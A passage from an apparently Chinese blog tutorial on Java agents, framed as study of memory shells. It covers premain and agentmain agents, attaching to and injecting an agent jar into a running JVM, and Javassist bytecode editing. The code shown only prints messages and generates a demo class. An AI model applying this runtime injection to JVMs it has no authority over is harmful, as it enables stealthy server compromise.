+<a class=anchor href=#premain-agent>#</a></h3><p>从官方文档中可以知道，首先我们必须实现<code>premain()</code>方法，同时我们 jar 文件的清单（manifest）中必须要含有<code>Premain-Class</code>属性。</p><p>我们可以在命令行利用<code>-javaagent</code>来实现启动时加载。</p><p><img src=https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/premain.png alt></p><p><code>premain()</code>方法顾名思义，会在我们运行<code>main()</code>方法之前进行调用，即在运行<code>main()</code>方法之前会去调用我们 jar 包中<code>Premain-Class</code>类中的<code>premain()</code>方法。</p><p>我们先来实现一个简单的<code>premain-Agent</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.premain.agent;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.instrument.Instrumentation;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JavaAgentPremain</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>premain</span>(String args, Instrumentation inst){
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> 10; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;调用了 premain agent&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>然后在<code>resources/META-INF/</code>下创建<code>agent.MF</code>清单文件用来指定<code>premain-Agent</code>的启动类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-mf data-lang=mf><span style=display:flex><span><span style=color:#a6e22e>Manifest-Version</span><span style=color:#f92672>:</span> 1.0
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Premain-Class</span><span style=color:#f92672>:</span> com.premain.agent.JavaAgentPremain
+</span></span></code></pre></div><p>mvn 编译之后进行打包，并指定启动项，运行结束后将会生成 agent.jar 文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cmd data-lang=cmd><span style=display:flex><span>jar cvfm agent.jar src\main\resources\META-INF\agent.MF -C target\classes .
+</span></span></code></pre></div><p>然后按照这个样子继续写个目标类，再直接运行<code>java -javaagent:agent.jar=Hello -jar hello.jar</code>即可。</p><p>结果就是 agent 中<code>premain()</code>的代码被优先执行了。</p><p><img src=https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentSuccess.png alt></p><h3 id=agentmain-agent>agentmain-Agent
+<a class=anchor href=#agentmain-agent>#</a></h3><p>相较于<code>premain-Agent</code>只能在 JVM 启动前加载，<code>agentmain-Agent</code>能够在 JVM 启动之后加载并实现相应的修改字节码功能。下面先了解一下和 JVM 有关的两个类。</p><h4 id=virtualmachine-类>VirtualMachine 类
+<a class=anchor href=#virtualmachine-%e7%b1%bb>#</a></h4><p><code>com.sun.tools.attach.VirtualMachine</code>类可以实现获取 JVM 信息，内存 dump、线程 dump、类信息统计（例如 JVM 加载的类）等功能。</p><p>该类允许我们通过<code>attach()</code>方法传入一个 JVM 的 PID，来远程连接到该 JVM 上，之后我们就可以对连接的 JVM 进行各种操作，如注入 Agent。下面是该类的主要方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span>
+</span></span><span style=display:flex><span>VirtualMachine.<span style=color:#a6e22e>attach</span>()
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#75715e>//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span>
+</span></span><span style=display:flex><span>VirtualMachine.<span style=color:#a6e22e>loadAgent</span>()
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#75715e>//获得当前所有的JVM列表</span>
+</span></span><span style=display:flex><span>VirtualMachine.<span style=color:#a6e22e>list</span>()
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#75715e>//解除与特定JVM的连接</span>
+</span></span><span style=display:flex><span>VirtualMachine.<span style=color:#a6e22e>detach</span>()
+</span></span></code></pre></div><h4 id=virtualmachinedescriptor-类>VirtualMachineDescriptor 类
+<a class=anchor href=#virtualmachinedescriptor-%e7%b1%bb>#</a></h4><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如 PID、虚拟机名称等。下面是一个获取特定虚拟机 PID 的实例。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.premain.agent;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.tools.attach.VirtualMachine;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.tools.attach.VirtualMachineDescriptor;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.List;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>get_PID</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>VirtualMachineDescriptor<span style=color:#f92672>&gt;</span> list <span style=color:#f92672>=</span> VirtualMachine.<span style=color:#a6e22e>list</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (VirtualMachineDescriptor vmd : list) {
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(vmd.<span style=color:#a6e22e>id</span>());
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>下面实现一个<code>agentmain-Agent</code>。首先我们编写一个<code>Sleep_Hello</code>类，模拟正在运行的 JVM：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import static</span> java.lang.Thread.sleep;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Sleep_Hello</span> {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> InterruptedException {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (<span style=color:#66d9ef>true</span>){  
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;Hello World!&#34;</span>);  
+</span></span><span style=display:flex><span>            sleep(5000);  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>然后编写我们的<code>agentmain-Agent</code>类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.instrument.Instrumentation;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>import static</span> java.lang.Thread.sleep;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Java_Agent_agentmain</span> {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>agentmain</span>(String args, Instrumentation inst) <span style=color:#66d9ef>throws</span> InterruptedException {  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (<span style=color:#66d9ef>true</span>){  
+</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;调用了agentmain-Agent!&#34;</span>);  
+</span></span><span style=display:flex><span>            sleep(3000);  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>然后配置对应的 mf 文件并进行编译打包。编译打包时可以在 pom.xml 中添加内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;build&gt;</span>  
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;plugins&gt;</span>  
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;plugin&gt;</span>  
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;groupId&gt;</span>org.apache.maven.plugins<span style=color:#f92672>&lt;/groupId&gt;</span>  
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;artifactId&gt;</span>maven-assembly-plugin<span style=color:#f92672>&lt;/artifactId&gt;</span>  
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;version&gt;</span>2.6<span style=color:#f92672>&lt;/version&gt;</span>  
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;configuration&gt;</span>  
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;descriptorRefs&gt;</span>  
+</span></span><span style=display:flex><span>          <span style=color:#f92672>&lt;descriptorRef&gt;</span>jar-with-dependencies<span style=color:#f92672>&lt;/descriptorRef&gt;</span>  
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/descriptorRefs&gt;</span>  
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;archive&gt;</span>  
+</span></span><span style=display:flex><span>          <span style=color:#f92672>&lt;manifestFile&gt;</span>  
+</span></span><span style=display:flex><span>            src/main/resources/META-INF/MAINFEST.MF  
+</span></span><span style=display:flex><span>          <span style=color:#f92672>&lt;/manifestFile&gt;</span>  
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/archive&gt;</span>  
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;/configuration&gt;</span>  
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/plugin&gt;</span>  
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;plugin&gt;</span>  
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;groupId&gt;</span>org.apache.maven.plugins<span style=color:#f92672>&lt;/groupId&gt;</span>  
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;artifactId&gt;</span>maven-compiler-plugin<span style=color:#f92672>&lt;/artifactId&gt;</span>  
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;configuration&gt;</span>  
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;source&gt;</span>6<span style=color:#f92672>&lt;/source&gt;</span>  
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;target&gt;</span>6<span style=color:#f92672>&lt;/target&gt;</span>  
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;/configuration&gt;</span>  
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/plugin&gt;</span>  
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/plugins&gt;</span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/build&gt;</span>
+</span></span></code></pre></div><p>然后用<code>mvn:assembly</code>进行打包。</p><p>然后会获取到两个 jar 包。最后准备一个<code>Inject</code>类，将我们的<code>agentmain</code>注入目标 JVM：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Inject_Agent</span> {  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {  
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//调用VirtualMachine.list()获取正在运行的JVM列表  </span>
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>VirtualMachineDescriptor<span style=color:#f92672>&gt;</span> list <span style=color:#f92672>=</span> VirtualMachine.<span style=color:#a6e22e>list</span>();  
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span>(VirtualMachineDescriptor vmd : list){  
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  </span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(vmd.<span style=color:#a6e22e>displayName</span>().<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;com.solo.Sleep_Hello&#34;</span>)){  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//连接指定JVM  </span>
+</span></span><span style=display:flex><span>                VirtualMachine virtualMachine <span style=color:#f92672>=</span> VirtualMachine.<span style=color:#a6e22e>attach</span>(vmd.<span style=color:#a6e22e>id</span>());  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//加载Agent  </span>
+</span></span><span style=display:flex><span>                virtualMachine.<span style=color:#a6e22e>loadAgent</span>(<span style=color:#e6db74>&#34;E:\\Coding\\Java\\Java-Agent-Memshell\\Agentmain\\target\\agentdemo-1.0-SNAPSHOT-jar-with-dependencies.jar&#34;</span>);  
+</span></span><span style=display:flex><span>                <span style=color:#75715e>//断开JVM连接  </span>
+</span></span><span style=display:flex><span>                virtualMachine.<span style=color:#a6e22e>detach</span>();  
+</span></span><span style=display:flex><span>            }  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        }  
+</span></span><span style=display:flex><span>    }  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>先运行目标 JVM，再运行<code>Inject</code>类进行注入，结果就是一开始只输出<code>hello,world</code>，运行<code>Inject</code>之后就插入了<code>agentmain</code>方法。</p><h3 id=动态修改字节码>动态修改字节码
+<a class=anchor href=#%e5%8a%a8%e6%80%81%e4%bf%ae%e6%94%b9%e5%ad%97%e8%8a%82%e7%a0%81>#</a></h3><p>在实现<code>premain()</code>的时候，我们除了能获取到<code>agentArgs</code>参数，还可以获取<code>Instrumentation</code>实例，那么<code>Instrumentation</code>实例是什么，在这之前先简单了解一下 Javassist。</p><h4 id=javassist>Javassist
+<a class=anchor href=#javassist>#</a></h4><h5 id=什么是-javassist>什么是 Javassist
+<a class=anchor href=#%e4%bb%80%e4%b9%88%e6%98%af-javassist>#</a></h5><p>Java 字节码以二进制的形式存储在<code>.class</code>文件中，每一个<code>.class</code>文件包含一个 Java 类或接口。Javassist 是一个用来处理 Java 字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象，其使用方式类似于反射。</p><h5 id=classpool>ClassPool
+<a class=anchor href=#classpool>#</a></h5><p><code>ClassPool</code>是一个<code>CtClass</code>对象的容器。<code>CtClass</code>对象必须从该对象中获得。如果<code>get()</code>在此对象上调用，则它将搜索表示的各种源<code>ClassPath</code>以查找类文件，然后创建一个<code>CtClass</code>表示该类文件的对象。创建的对象将返回给调用者。可以理解为一个存放<code>CtClass</code>对象的容器。</p><p>获取方法：<code>ClassPool cp = ClassPool.getDefault()</code>。通过<code>ClassPool.getDefault()</code>获取的<code>ClassPool</code>使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类</strong>，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，<strong>ClassPool 必须添加额外的类搜索路径。</strong></p><p>比如：<code>cp.insertClassPath(new ClassClassPath(&lt;Class>));</code>。</p><h5 id=ctclass>CtClass
+<a class=anchor href=#ctclass>#</a></h5><p>可以理解为加强版的 Class 对象，我们可以通过<code>CtClass</code>对目标类进行各种操作。可以从<code>ClassPool.get(ClassName)</code>中获取。</p><h5 id=ctmethod>CtMethod
+<a class=anchor href=#ctmethod>#</a></h5><p>同理，可以理解成加强版的<code>Method</code>对象。可通过<code>CtClass.getDeclaredMethod(MethodName)</code>获取，该类提供了一些方法以便我们能够直接修改方法体。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CtMethod</span> <span style=color:#66d9ef>extends</span> CtBehavior {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// 主要的内容都在父类 CtBehavior 中</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#75715e>// 父类 CtBehavior</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>abstract</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CtBehavior</span> <span style=color:#66d9ef>extends</span> CtMember {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// 设置方法体</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setBody</span>(String src);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// 插入在方法体最前面</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>insertBefore</span>(String src);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// 插入在方法体最后面</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>insertAfter</span>(String src);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// 在方法体的某一行插入内容</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>insertAt</span>(<span style=color:#66d9ef>int</span> lineNum, String src);
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>传递给方法<code>insertBefore()</code>、<code>insertAfter()</code>、<code>insertAt()</code>的 String 对象是由 Javassist 的编译器编译的。由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p><p><img src=https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/javassist.png alt></p><h5 id=使用示例>使用示例
+<a class=anchor href=#%e4%bd%bf%e7%94%a8%e7%a4%ba%e4%be%8b>#</a></h5><p>pom.xml：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;dependency&gt;</span>  
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;groupId&gt;</span>org.javassist<span style=color:#f92672>&lt;/groupId&gt;</span>  
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;artifactId&gt;</span>javassist<span style=color:#f92672>&lt;/artifactId&gt;</span>  
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;version&gt;</span>3.27.0-GA<span style=color:#f92672>&lt;/version&gt;</span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>测试类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> javassist;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Modifier;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Javassist_Test</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>Create_Person</span>() <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//获取 CtClass 对象的容器 ClassPool</span>
+</span></span><span style=display:flex><span>        ClassPool classPool <span style=color:#f92672>=</span> ClassPool.<span style=color:#a6e22e>getDefault</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//创建一个新类 Javassist.Learning.Person</span>
+</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> classPool.<span style=color:#a6e22e>makeClass</span>(<span style=color:#e6db74>&#34;javassist.Person&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//创建一个类属性 name</span>
+</span></span><span style=display:flex><span>        CtField ctField1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> CtField(classPool.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;java.lang.String&#34;</span>), <span style=color:#e6db74>&#34;name&#34;</span>, ctClass);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//设置属性访问符</span>
+</span></span><span style=display:flex><span>        ctField1.<span style=color:#a6e22e>setModifiers</span>(Modifier.<span style=color:#a6e22e>PRIVATE</span>);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//将 name 属性添加进 Person 中，并设置初始值</span>
+</span></span><span style=display:flex><span>        ctClass.<span style=color:#a6e22e>addField</span>(ctField1, CtField.<span style=color:#a6e22e>Initializer</span>.<span style=color:#a6e22e>constant</span>(<span style=color:#e6db74>&#34;solo&#34;</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//向 Person 类中添加 setter 和 getter</span>
+</span></span><span style=display:flex><span>        ctClass.<span style=color:#a6e22e>addMethod</span>(CtNewMethod.<span style=color:#a6e22e>setter</span>(<span style=color:#e6db74>&#34;setName&#34;</span>, ctField1));
+</span></span><span style=display:flex><span>        ctClass.<span style=color:#a6e22e>addMethod</span>(CtNewMethod.<span style=color:#a6e22e>getter</span>(<span style=color:#e6db74>&#34;getName&#34;</span>, ctField1));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//创建一个无参构造</span>
+</span></span><span style=display:flex><span>        CtConstructor ctConstructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> CtConstructor(<span style=color:#66d9ef>new</span> CtClass<span style=color:#f92672>[]</span>{}, ctClass);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//设置方法体</span>
+</span></span><span style=display:flex><span>        ctConstructor.<span style=color:#a6e22e>setBody</span>(<span style=color:#e6db74>&#34;{name = \&#34;solo\&#34;;}&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//向Person类中添加无参构造</span>
+</span></span><span style=display:flex><span>        ctClass.<span style=color:#a6e22e>addConstructor</span>(ctConstructor);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//创建一个类方法printName</span>
+</span></span><span style=display:flex><span>        CtMethod ctMethod <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> CtMethod(CtClass.<span style=color:#a6e22e>voidType</span>,<span style=color:#e6db74>&#34;printName&#34;</span>, <span style=color:#66d9ef>new</span> CtClass<span style=color:#f92672>[]</span>{}, ctClass);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//设置方法访问符</span>
+</span></span><span style=display:flex><span>        ctMethod.<span style=color:#a6e22e>setModifiers</span>(Modifier.<span style=color:#a6e22e>PRIVATE</span>);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//设置方法体</span>
+</span></span><span style=display:flex><span>        ctMethod.<span style=color:#a6e22e>setBody</span>(<span style=color:#e6db74>&#34;{System.out.println(name);}&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//将该方法添加进Person中</span>
+</span></span><span style=display:flex><span>        ctClass.<span style=color:#a6e22e>addMethod</span>(ctMethod);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//将生成的字节码写入文件</span>
+</span></span><span style=display:flex><span>        ctClass.<span style=color:#a6e22e>writeFile</span>(<span style=color:#e6db74>&#34;E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\src\\main\\java&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        Create_Person();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>生成的 class 文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Source code recreated from a .class file by IntelliJ IDEA</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// (powered by FernFlower decompiler)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>package</span> javassist;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Person</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;solo&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setName</span>(String var1) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> var1;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getName</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>name</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Person</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;solo&#34;</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>printName</span>() {
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>name</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
